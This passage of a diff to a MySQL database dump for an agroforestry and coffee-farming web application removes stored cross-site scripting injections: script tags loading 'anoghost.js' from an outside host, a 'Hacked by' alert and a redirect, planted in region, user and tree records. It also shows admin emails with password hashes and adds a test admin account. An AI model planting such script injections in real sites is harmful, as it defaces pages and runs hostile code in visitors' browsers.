 (6674, 'Burundi', 'East', 'Arabica', 'Medium precipitation', 'falling branches', '0.000'),
 (6675, 'Burundi', 'East', 'Arabica', 'Medium precipitation', 'falling branches', '0.000'),
 (6676, 'Burundi', 'East', 'Arabica', 'Medium precipitation', 'falling branches', '0.000'),
 (6677, 'Burundi', 'East', 'Arabica', 'Medium precipitation', 'falling branches', '0.000'),
 (6678, 'Burundi', 'East', 'Arabica', 'Medium precipitation', 'falling branches', '0.000'),
-(6679, 'Burundi', 'East', 'Arabica', 'Medium precipitation', 'food', '0.000'),
+(6679, 'Burundi', 'East', 'Arabica', 'Medium precipitation', 'food', '0.000');
+INSERT INTO `farmerweights` (`id_weight`, `country`, `region`, `crop`, `subgroup`, `attribute`, `weight`) VALUES
 (6680, 'Burundi', 'East', 'Arabica', 'Medium precipitation', 'food', '0.000'),
 (6681, 'Burundi', 'East', 'Arabica', 'Medium precipitation', 'food', '0.000'),
 (6682, 'Burundi', 'East', 'Arabica', 'Medium precipitation', 'food', '0.000'),
@@ -14782,8 +14774,6 @@ CREATE TABLE `region` (
 --
 
 INSERT INTO `region` (`id_region`, `country`, `region`) VALUES
-(49, '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>'),
-(50, '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>  <script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>   '),
 (51, 'Ghana', 'West'),
 (53, 'China', 'South Yunnan'),
 (54, 'Laos', 'South Laos'),
@@ -14808,8 +14798,9 @@ CREATE TABLE `sys_users` (
 --
 
 INSERT INTO `sys_users` (`id_user`, `name`, `email`, `password`, `role`) VALUES
-(3, '<script>alert(\"Hacked by @rctic_0\")</script>mmm', 'enoch.k@metajua.com', '65bce6b51ef72fc51b9e89063445854348f0ce09', 'Admin'),
-(4, '<script>window.location=\"http://www.aiptsewa.com\"</script>llllllllll', 'ambrose.o@metajua.com', '658a148289e0cc5025733a395055873099ce54c1', 'Admin');
+(3, '', 'enoch.k@metajua.com', '65bce6b51ef72fc51b9e89063445854348f0ce09', 'Admin'),
+(4, '', 'ambrose.o@metajua.com', '658a148289e0cc5025733a395055873099ce54c1', 'Admin'),
+(6, 'test', 'test@test.com', 'e54d55b2a413ba085b49ef3ef5ed78089f58039a', 'admin');
 
 -- --------------------------------------------------------
 
@@ -14944,8 +14935,7 @@ CREATE TABLE `tree_library` (
 INSERT INTO `tree_library` (`id`, `image`, `Latin_genus`, `Latin_family`, `Latin_species`, `Subspecies`, `Name_english`, `Name_luganda`, `French_Name`, `Swahili_Name`, `size`, `growth_rate`, `Years_to_mature`, `grows_in_sun`, `grows_in_shade`, `grows_in_any_soil`, `drought_resistant`, `provides_firewood`, `provides_charcoal`, `provides_food`, `provides_mulch`, `Construction_provides_poles`, `Construction_provides_beams`, `Construction_timber_quality`, `Construction_type`, `Construction_durable_outdoors`, `Construction_durable_in_water`, `Natural_regeneration`, `Stem_cuttings_success_rate`, `Remarks`, `User_comments`, `prota4u`, `agroforestree`, `FAO`, `Figweb`, `Plantzafrica`) VALUES
 (6, 'images/trees/Cordia_Africana.png', 'Cordia', '', 'africana', 'No', 'Large leaved Cordia', 'Mukebu', '', '', 'Medium', 'Moderate', '20', 'Yes', 'Yes', 'Yes', 'No', 'Yes', 'Yes', 'Yes', 'Yes', 'No', 'Yes', 'High', 'Light', 'Yes', 'No', 'Yes', 'Low', '', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', 'http://www.fao.org/docrep/x5327e/x5327e0u.htm', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>'),
 (7, 'images/trees/Markhamia_lutea.png', 'Markhamia', 'lutea', 'No', 'Markhamia', 'Nsambya', '', '', '', 'Large', 'Fast', '10', 'No', 'Yes', 'Yes', 'Yes', 'Yes', 'Yes', 'No', 'Yes', 'Yes', 'Yes', 'Moderate', 'Light', 'Yes', 'No', 'Yes', 'High', 'Drought resistant, extensive rooting system: nutrient competition, odourless smoke', '', 'http://www.prota4u.info/protav8.asp?h=M26&t=Markhamia_lutea&p=Markhamia+lutea', 'http://www.worldagroforestry.org/treedb2/speciesprofile.php?Spid=1121', '', '', ''),
-(8, 'images/trees/Spathodea_campanulata2.png', 'Spathodea', '', 'campanulata', 'No', 'Tulip tree (Uganda flame tree)', 'Nandi', '', '', 'Large', 'Moderate', '', 'Yes', 'Yes', 'Yes', 'Yes', 'Yes', 'No', 'No', 'Yes', 'Yes', 'Yes', 'Moderate', 'Light', 'Yes', 'No', 'Yes', '', 'Drought resistant', '', 'http://www.prota4u.info/protav8.asp?h=M26&t=Spathodea_campanulata&p=Spathodea+campanulata', 'http://www.worldagroforestry.org/treedb2/speciesprofile.php?Spid=1539', '', '', ''),
-(9, '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>', '<script type=\"text/javascript\" src=\"http://yourjavascript.com/15216817359/anoghost.js\"></script>');
+(8, 'images/trees/Spathodea_campanulata2.png', 'Spathodea', '', 'campanulata', 'No', 'Tulip tree (Uganda flame tree)', 'Nandi', '', '', 'Large', 'Moderate', '', 'Yes', 'Yes', 'Yes', 'Yes', 'Yes', 'No', 'No', 'Yes', 'Yes', 'Yes', 'Moderate', 'Light', 'Yes', 'No', 'Yes', '', 'Drought resistant', '', 'http://www.prota4u.info/protav8.asp?h=M26&t=Spathodea_campanulata&p=Spathodea+campanulata', 'http://www.worldagroforestry.org/treedb2/speciesprofile.php?Spid=1539', '', '', '');
 
 -- --------------------------------------------------------
 
@@ -15203,7 +15193,7 @@ ALTER TABLE `region`
 -- AUTO_INCREMENT for table `sys_users`
 --
 ALTER TABLE `sys_users`
-  MODIFY `id_user` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;
+  MODIFY `id_user` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;
 
 --
 -- AUTO_INCREMENT for table `tool_user`
